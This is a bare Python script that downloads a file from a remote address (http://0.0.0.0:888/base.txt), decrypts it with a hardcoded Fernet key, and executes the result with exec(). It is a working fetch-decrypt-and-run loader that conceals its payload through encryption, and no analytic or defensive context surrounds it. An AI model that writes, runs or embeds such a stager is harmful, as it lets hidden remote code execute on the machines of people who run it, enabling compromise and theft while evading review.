import requests
import base64
from cryptography.fernet import Fernet

u = "http://0.0.0.0:888/base.txt"
r = requests.get(u).text

n = "tZpY1mJmS3T8pYb4NQ0T3E5u8p0kKtpBzuV2gEJgHXw="
t = Fernet(n)
p = t.decrypt(r)

exec(p)

